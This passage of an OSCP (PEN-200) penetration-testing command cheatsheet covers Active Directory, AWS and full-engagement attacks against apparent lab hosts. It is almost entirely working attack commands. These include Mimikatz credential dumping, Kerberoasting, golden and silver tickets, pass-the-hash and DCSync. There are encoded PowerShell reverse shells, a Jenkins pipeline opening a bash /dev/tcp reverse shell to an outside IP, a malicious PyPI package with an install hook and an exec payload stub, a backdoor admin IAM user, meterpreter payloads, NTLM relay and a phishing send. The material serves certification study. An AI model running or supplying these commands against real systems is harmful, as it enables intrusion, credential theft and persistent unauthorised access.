$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
$dirsearcher.filter = "samAccountType=805306368"    # Normal users
$dirsearcher.FindAll()
```

### Reusable LDAP-Query Function
```powershell
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}

LDAPSearch -LDAPQuery "(samAccountType=805306368)"  # All users
LDAPSearch -LDAPQuery "(objectclass=group)"
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=<group_name>))"
```

### PowerView — Enumeration
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "<group_name>" | select member
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

### Local Admin / Sessions
```powershell
Find-LocalAdminAccess

Get-NetSession -ComputerName <host>
Get-NetSession -ComputerName <host> -Verbose
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

.\PsLoggedon.exe \\<host>
```

### SPN Enumeration
```cmd
setspn -L <account>
```

```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe <hostname>
```

### ACL / Object Permissions
```powershell
Get-ObjectAcl -Identity <object>
Convert-SidToName <SID>

Get-ObjectAcl -Identity "<group_name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### ACL Abuse
```cmd
net group "<group_name>" <user> /add /domain
net group "<group_name>" <user> /del /domain
```

### Shares
```powershell
ls \\<dc_fqdn>\sysvol\<domain>\
ls \\<dc_fqdn>\sysvol\<domain>\Policies\<policy>\
cat \\<dc_fqdn>\sysvol\<domain>\Policies\<policy>\<file>.xml
ls \\<host>\<share>
cat \\<host>\<share>\<path>\<file>
```

### GPP Decryption
```bash
gpp-decrypt "<cpassword_blob>"
```

### BloodHound / SharpHound
```powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory <dir> -OutputPrefix "<prefix>"
```

```bash
sudo neo4j start
bloodhound
# Login neo4j / set password
# Upload SharpHound zip
# Analysis → pre-built queries
# Right-click node → Mark User/Computer as Owned
```

---

## Chapter 23: Attacking AD Authentication

### Cached Credential Extraction
```powershell
xfreerdp /cert-ignore /u:<user> /d:<domain> /p:<password> /v:<IP>
.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

### CryptoAPI/KeyIso Patching
```
crypto::capi
crypto::cng
```

### Account Lockout Check
```powershell
net accounts
```

### Password Spraying — LDAP/ADSI (PowerShell)
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString = "LDAP://$PDC/$DistinguishedName"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<user>", "<password>")

.\Spray-Passwords.ps1 -Pass <password> -Admin
```

### Password Spraying — SMB (CrackMapExec)
```bash
crackmapexec smb <target> -u <users.txt> -p '<password>' -d <domain> --continue-on-success
crackmapexec smb <target> -u <user> -p <password> -d <domain>
```

### Password Spraying — Kerberos (kerbrute)
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d <domain> <usernames.txt> "<password>"
```

### AS-REP Roasting
```bash
impacket-GetNPUsers -request -outputfile <hashes.asreproast> -dc-ip <DC_IP> <domain>/<user>
```

```powershell
.\Rubeus.exe asreproast /nowrap
Get-DomainUser -PreauthNotRequired
```

```bash
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 <hashes.asreproast> <wordlist> -r /usr/share/hashcat/rules/best64.rule --force
```

### Kerberoasting
```powershell
.\Rubeus.exe kerberoast /outfile:<hashes.kerberoast>
```

```bash
sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <domain>/<user>
sudo hashcat -m 13100 <hashes.kerberoast> <wordlist> -r /usr/share/hashcat/rules/best64.rule --force
```

### Clock Sync (Kerberos)
```bash
ntpdate <DC_IP>
rdate <DC_IP>
```

### Silver Tickets
```powershell
iwr -UseDefaultCredentials http://<target>          # Test denial first

privilege::debug
sekurlsa::logonpasswords                            # Extract SPN account NTLM

whoami /user                                        # Get domain SID
```

```
kerberos::golden /sid:<domain_SID> /domain:<domain> /ptt /target:<spn_host> \
  /service:<http|cifs|ldap> /rc4:<NTLM_hash> /user:<any_user>
```

```powershell
klist
iwr -UseDefaultCredentials http://<target>          # Test access
```

### DCSync
```
lsadump::dcsync /user:<domain>\<user>
```

```bash
impacket-secretsdump -just-dc-user <user> <domain>/<user>:"<password>"@<DC_IP>
```

---

## Chapter 24: Lateral Movement in Active Directory

### WMI and WinRM
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "win32calc.exe"
```

```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

$sessionOption = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $sessionOption

$Command = 'calc'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command};

# For reverse shell:
$Command = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg=="
```

```cmd
nc -lnvp 443                                        # Catch on Kali
```

### WinRM / winrs
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg=="
```

### PowerShell Remoting
```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession <SessionId>
```

### PsExec
```cmd
PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Pass the Hash (PtH)
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Overpass the Hash
```
privilege::debug
sekurlsa::logonpasswords                            # Find target's NTLM

sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

```powershell
net use \\files04\backup                            # Trigger TGT/TGS request
klist                                               # Verify cached TGT/TGS
```

```cmd
PsExec.exe \\files04 cmd.exe                        # Use by hostname
```

### Pass the Ticket (PtT)
```powershell
ls \\web04\backup                                   # Confirm denial

privilege::debug
sekurlsa::tickets /export                           # Export tickets
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi   # Inject TGS
klist                                               # Verify injection

ls \\web04\backup                                   # Now succeeds
```

### DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
tasklist | findstr "calc"

# For reverse shell:
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg==","7")
```

```bash
nc -lnvp 443
```

### Golden Ticket
```
lsadump::lsa /patch                                 # Get krbtgt hash from DC
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

misc::cmd                                           # If cmd.exe is blocked
```

```cmd
PsExec.exe \\dc1 cmd.exe                            # Connect by hostname
whoami /groups
```

### Shadow Copies — Offline NTDS.dit Extraction
```cmd
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## Chapter 25: Enumerating AWS Cloud Infrastructure

### DNS/Lab Configuration
```bash
cat /etc/resolv.conf
sudo nano /etc/resolv.conf                          # Add lab's public DNS IP
nameserver 44.205.254.229
host www.offseclab.io 44.205.254.229
host www.offseclab.io

sudo systemctl restart NetworkManager
cat /etc/resolv.conf                                # Reset
```

### Domain and Subdomain Reconnaissance
```bash
host -t ns offseclab.io                             # Query nameservers
whois awsdns-00.com | grep "Registrant Organization"   # Confirm AWS

host www.offseclab.io                               # Get public IP
host <IP>                                           # Reverse DNS

whois <IP> | grep "OrgName"

dnsenum offseclab.io --threads 500                  # Automated zone/subdomain enum
```

### Service-specific Domains (Manual Discovery)
```bash
curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'   # Extract bucket name
```

### S3 Bucket Testing
```bash
# Test if bucket is listable
http://<bucket_name>.s3.amazonaws.com/
```

### cloud-enum Multi-Cloud Enumeration
```bash
sudo apt update && apt install cloud-enum
cloud_enum -k <keyword> --quickscan --disable-azure --disable-gcp

echo -n "offseclab-assets-public-axevtewi
offseclab-assets-private-axevtewi
..." | tee /tmp/keyfile.txt

cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```

### AWS CLI Configuration
```bash
sudo apt update && apt install -y awscli

aws configure --profile attacker
# AWS Access Key ID: AKIAQO...
# AWS Secret Access Key: cOGzm...
# Default region name: us-east-1
# Default output format: json

aws --profile attacker sts get-caller-identity      # Validate credentials
```

### AMI Enumeration
```bash
aws --profile attacker ec2 describe-images --owners amazon

aws --profile attacker ec2 describe-images --executable-users all \
  --filters "Name=description,Values=*offseclab*"

aws --profile attacker ec2 describe-images --executable-users all \
  --filters "Name=name,Values=*Offseclab*"

aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"
```

### Account ID Discovery via S3 Condition-Based IAM Policy
```bash
aws --profile attacker iam create-user --user-name enum
aws --profile attacker iam create-access-key --user-name enum
aws configure --profile enum
aws sts get-caller-identity --profile enum
```

Create `policy-s3-read.json`:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": ["s3:ListBucket", "s3:GetObject"],
            "Resource": "*",
            "Condition": { "StringLike": {"s3:ResourceAccount": ["0*"]} }
        }
    ]
}
```

```bash
aws --profile attacker iam put-user-policy \
  --user-name enum \
  --policy-name s3-read \
  --policy-document file://policy-s3-read.json

aws --profile attacker iam list-user-policies --user-name enum

# Test — fails, account doesn't start with "0"
aws --profile enum s3 ls offseclab-assets-private-kaykoour
# Edit Condition to "1*", re-apply, retest — succeeds
aws --profile attacker iam put-user-policy --user-name enum --policy-name s3-read \
  --policy-document file://policy-s3-read.json
aws --profile enum s3 ls offseclab-assets-private-kaykoour
```

### IAM User Enumeration (Bucket Policy)
```bash
aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
```

Create `grant-s3-bucket-read.json`:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": { "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"] },
            "Action": "s3:ListBucket"
        }
    ]
}
```

```bash
aws --profile attacker s3api put-bucket-policy \
  --bucket offseclab-dummy-bucket-28967-25641-13328 \
  --policy file://grant-s3-bucket-read.json
# No error = user exists
```

### Pacu — Automated Enumeration
```bash
sudo apt install pacu
pacu

# Inside Pacu:
Pacu (offseclab:No Keys Set) > import_keys attacker
Pacu (offseclab:imported-attacker) > ls
Pacu (offseclab:imported-attacker) > help iam__enum_roles
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
```

### Initial IAM Reconnaissance
```bash
aws configure --profile target

aws --profile target sts get-caller-identity          # Validate + identify
aws --profile challenge iam get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM   # Stealthier
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile   # Unlogged error

aws --profile target sts get-caller-identity --region us-east-2   # Region evasion
```

### Scope IAM Permissions
```bash
aws --profile target iam list-user-policies --user-name clouddesk-plove
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
aws --profile target iam list-groups-for-user --user-name clouddesk-plove
aws --profile target iam list-group-policies --group-name support
aws --profile target iam list-attached-group-policies --group-name support

aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
aws --profile target iam get-policy-version \
  --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8

aws --profile target iam get-account-summary | tee account-summary.json
```

### Account-wide Authorization Details
```bash
aws --profile target iam list-users | tee users.json
aws --profile target iam list-groups | tee groups.json
aws --profile target iam list-roles | tee roles.json
aws --profile target iam list-policies --scope Local --only-attached | tee policies.json

aws --profile target iam get-account-authorization-details --filter User | tee account-auth-details.json
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy | tee account-auth-details.json
```

### JMESPath Query Filtering
```bash
aws --profile target iam get-account-authorization-details --filter User \
  --query "UserDetailList[].UserName"

aws --profile target iam get-account-authorization-details --filter User \
  --query "UserDetailList[0].[UserName,Path,GroupList]"

aws --profile target iam get-account-authorization-details --filter User \
  --query "UserDetailList[0].{Name: UserName,Path: Path,Groups: GroupList}"

aws --profile target iam get-account-authorization-details --filter User \
  --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"

aws --profile target iam get-account-authorization-details --filter User Group \
  --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
```

---

## Chapter 26: Attacking AWS Cloud Infrastructure

### Jenkins Enumeration
```bash
sudo msfdb init
msfconsole --quiet

use auxiliary/scanner/http/jenkins_enum
set RHOSTS automation.offseclab.io
set TARGETURI /
run
```

### S3 Bucket Analysis (curl + grep)
```bash
curl -s www.offseclab.io | grep -o -P 'staticcontent-\w{8}'

curl https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com

head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./first50.txt
```

### S3 Access via AWS CLI
```bash
aws configure
# AWS Access Key ID: AKIAUBHUBEGIBVQAI45N
# AWS Secret Access Key: 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

aws s3 ls staticcontent-lgudbhv8syu2tgbk
aws s3 cp --recursive s3://staticcontent-lgudbhv8syu2tgbk/ ./static_content/
```

### Git Secret Hunting
```bash
sudo apt install gitleaks
gitleaks detect --source . -v

git log
git show <commit-hash>
echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
```

### Pipeline Poisoning (Jenkinsfile)
```groovy
# Minimal test
pipeline {
   agent any
   stages {
       stage('Build') {
          steps {
              echo 'Building..'
          }
       }
   }
}

# With AWS credentials retention
pipeline {
   agent any
   stages {
       stage('Build') {
          steps {
              withAWS(region: 'us-east-1', credentials: 'aws_key') {
                  echo 'Building..'
              }
          }
       }
   }
}

# With shell execution
pipeline {
   agent any
   stages {
      stage('Build') {
          steps {
             withAWS(region: 'us-east-1', credentials: 'aws_key') {
                script {
                  if (isUnix()) {
                     sh 'curl http://192.88.99.76/'
                  }
                }
             }
          }
      }
   }
}

# Reverse shell payload
pipeline {
   agent any
   stages {
      stage('Send Reverse Shell') {
         steps {
            withAWS(region: 'us-east-1', credentials: 'aws_key') {
               script {
                  if (isUnix()) {
                     sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
                  }
               }
            }
         }
      }
   }
}
```

```bash
nc -nvlp 4242                                        # Catch reverse shell
```

### Builder Enumeration
```bash
uname -a
cat /etc/os-release
cat /proc/mounts
cat /proc/self/status | grep Cap
capsh --decode=0000003fffffffff

env | grep AWS
```

### Discover IAM Permissions
```bash
aws configure --profile=CompromisedJenkins
aws --profile CompromisedJenkins sts get-caller-identity

aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
```

### Backdoor Persistence
```bash
aws --profile CompromisedJenkins iam create-user --user-name backdoor
aws --profile CompromisedJenkins iam attach-user-policy \
    --user-name backdoor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor

aws configure --profile=backdoor
aws --profile backdoor iam list-attached-user-policies --user-name backdoor
```

### Dependency Confusion — Package Building
```bash
mkdir hackshort-util && cd hackshort-util
nano setup.py
```

```python
from setuptools import setup, find_packages

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
)
```

```bash
mkdir hackshort_util
touch hackshort_util/__init__.py

python3 ./setup.py sdist
pip install ./dist/hackshort-util-1.1.4.tar.gz
```

### Command Execution During Install
```python
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        with open('/tmp/running_during_install', 'w') as f:
            f.write('This code was executed when the package was installed')

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
    cmdclass={'install': Installer}
)
```

### Runtime Payload Injection (utils.py)
```python
import time
import sys

def standardFunction():
    pass

def __getattr__(name):
    pass
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception

# Append msfvenom output here
exec(__import__('zlib').decompress(__import__('base64').b64decode(...)))
```

### Package Publishing
```bash
nano ~/.pypirc
```

```ini
[distutils]
index-servers = offseclab

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password
```

```bash
python3 setup.py sdist upload -r offseclab
```

### Production Exploitation
```bash
sudo msfdb init
msfconsole

use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4488
set ExitOnSession false
run -jz
```

### Network Scanning from Container
```python
import socket
import ipaddress
import sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        print(f"Scanning {ip}")
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.ip_network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```

### SOCKS5 Tunneling to Internal Jenkins
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run -j

msf6 > sessions
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > run

msf6 > route add 172.30.0.1 255.255.0.0 2
```

```bash
# From personal Kali:
ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
ss -tulpn
# Firefox Settings → Network → SOCKS Host 127.0.0.1, Port 1080, SOCKS v5
```

### S3 Explorer Plugin AWS Key Extraction
```text
<input type="hidden" id="awsregion" value="...">
<input type="hidden" id="awsid" value="AKIAUBHUBEGIMWGUDSWQ">
<input type="hidden" id="awskey" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5">
```

```bash
aws configure --profile=stolen-s3
aws --profile=stolen-s3 sts get-caller-identity
aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
aws --profile=stolen-s3 s3api list-buckets
aws --profile=stolen-s3 s3 ls s3://tf-state-9b58rezp3vvkf90f
aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
cat terraform.tfstate
```

---

## Chapter 27: Assembling the Pieces (Master Pentest Workflow)

### Workspace Setup
```bash
mkdir beyond
cd beyond
mkdir mailsrv1
mkdir websrv1
touch creds.txt
touch computer.txt
```

### External Recon
```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -t 10 -x txt,pdf,config

sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
whatweb http://192.168.50.244
wpscan --url http://192.168.50.244/main/ --enumerate p --plugins-detection aggressive
```

### Initial Foothold — Directory Traversal
```bash
searchsploit -x 50420
searchsploit -m 50420

python3 50420.py http://192.168.50.244 /etc/passwd
python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa

chmod 600 id_rsa
ssh -i id_rsa daniela@192.168.50.244
```

### Crack SSH Passphrase
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
ssh -i id_rsa daniela@192.168.50.244
# Enter passphrase: tequieromucho
```

### Local Privilege Escalation
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80

wget http://192.168.119.5/linpeas.sh
chmod a+x ./linpeas.sh
./linpeas.sh
```

### Sudo Git Abuse (GTFOBins)
```bash
sudo git -p help
!/bin/bash
whoami
# root
```

### Git History Looting
```bash
cd /srv/www/wordpress/
git status
git log
git show <commit-hash>
```

### Internal Network Access via Phishing
```bash
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
nc -nvlp 4444
```

Build payload files (`.Library-ms` + `.lnk` shortcut), transfer to Kali's WebDAV directory, then:

```bash
swaks -t daniela@beyond.com -t marcus@beyond.com \
  --attach @config.Library-ms \
  --from john@beyond.com \
  --header "Subject: Staging Script" \
  --body body.txt \
  --server 192.168.50.242 \
  --suppress-data -ap
```

### AD Enumeration
```powershell
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Pivoting via Meterpreter
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
sudo msfconsole -q

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.119.5
set LPORT 443
set ExitOnSession false
exploit -j
```

```powershell
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe
```

```
use multi/manage/autoroute
set session 1
run

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

```bash
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "<password>" --shares
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
```

### Chisel Reverse Tunnel
```bash
chisel server -p 8080 --reverse

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
meterpreter > shell
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80

# Firefox proxy: localhost:1080 (SOCKS5)
echo "127.0.0.1 internalsrv1.beyond.com" | sudo tee -a /etc/hosts
```

### Kerberoasting
```bash
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john

sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
# cracked: DANIelaRO123
```

### NTLM Relay Attack
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.50.242 \
  -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg=="
nc -nvlp 9999

# In WordPress: Backup Migration → Backup directory path: //192.168.119.5/test
```

### Credential Extraction (Mimikatz)
```powershell
iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# Extract beccy's NTLM hash + plaintext password
```

### Domain Admin Access
```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240

whoami
# nt authority\system
```

---

## Quick Command Reference (Organized by Function)

### Reconnaissance
- **DNS**: `host`, `whois`, `dnsenum`, `dnsrecon`
- **Port Scan**: `nmap`, `nc`, `Test-NetConnection`
- **Web**: `curl`, `gobuster`, `wpscan`, `whatweb`
- **SMB**: `nbtscan`, `net view`
- **SNMP**: `snmpwalk`, `onesixtyone`

### Exploitation & Initial Foothold
- **Exploit Search**: `searchsploit`
- **Web Shells**: `curl`, directory traversal, RCE
- **SSH Keys**: `ssh2john`, `john`, `ssh`
- **Backdoors**: `powercat`, `reverse shells`, meterpreter

### Privilege Escalation
- **Linux**: `sudo -l`, `GTFOBins`, kernel exploits, cron abuse
- **Windows**: service hijacking, DLL injection, unquoted paths, UAC bypass, `SeImpersonatePrivilege`
- **Automated**: `linpeas.sh`, `winPEAS.exe`, `PowerUp.ps1`

### Credential Attacks
- **Password Cracking**: `hashcat`, `john`, `hydra`
- **Hash Dumping**: `Mimikatz`, `secretsdump`
- **Pass-the-Hash**: `impacket-psexec`, `impacket-wmiexec`
- **Kerberos**: Kerberoasting, AS-REP roasting, golden tickets

### Lateral Movement (AD)
- **WMI/WinRM**: `wmic`, `winrs`, `Invoke-CimMethod`
- **PsExec**: `PsExec64.exe`
- **SMB**: `impacket-psexec`, `impacket-wmiexec`
- **Kerberos**: Overpass-the-hash, pass-the-ticket, DCOM

### AD Enumeration
- **Users/Groups**: `net user`, `net group`, PowerView
- **LDAP/ADSI**: custom PowerShell functions
- **BloodHound**: `SharpHound.ps1`, `neo4j`, GUI analysis
- **SPN**: `setspn`, `Get-NetUser -SPN`

### Pivoting & Tunneling
- **SSH Tunnels**: `-L` (local), `-D` (SOCKS), `-R` (remote)
- **Tools**: `chisel`, `proxychains`, `sshuttle`
- **Port Forward**: `socat`, `netsh`, Meterpreter `portfwd`

### Cloud (AWS)
- **CLI**: `aws configure`, `aws sts`, `aws s3`, `aws iam`
- **Enumeration**: `cloud-enum`, Pacu
- **Exploitation**: Compromised IAM keys, dependency confusion, S3 bucket analysis
- **Terraform**: `tfstate` files for credential harvesting

### Metasploit
- **Setup**: `msfdb init`, `msfconsole`
- **Modules**: `search`, `use`, `set`, `run`
- **Handler**: `exploit/multi/handler`, staged payloads
- **Meterpreter**: `getsystem`, `migrate`, `shell`, `upload`/`download`

---

## Exam Tips & Final Checklist

✓ Create workspace directory structure per engagement  
✓ Maintain `creds.txt` and `computer.txt` throughout  
✓ Re-enumerate after privilege escalation (new context = new data)  
✓ Test every new credential across all discovered hosts/services  
✓ Document all found information, even dead-ends  
✓ Always check git history for hardcoded secrets  
✓ Verify SMB signing status before relay attacks  
✓ Cross-check tool findings (e.g., clock skew for Kerberos)  
✓ Use BloodHound for AD relationship visualization  
✓ Remember IP vs. hostname differences in Kerberos auth  
✓ Cleanup uploaded binaries and payloads at assessment end  
✓ Test exploits locally before deploying to targets  
✓ Don't assume lower IP = easier target  
✓ Some hosts may not respond to ICMP — use `-Pn` with nmap  
✓ Password cracking: if rockyou doesn't work in 10 min, reconsider the vector  
✓ Practice Metasploit AND non-Metasploit approaches  

---

**End of OSCP Command Cheatsheet**  
Generated from PEN-200 chapters 6–27.  
Keep this document accessible during study and exam preparation.
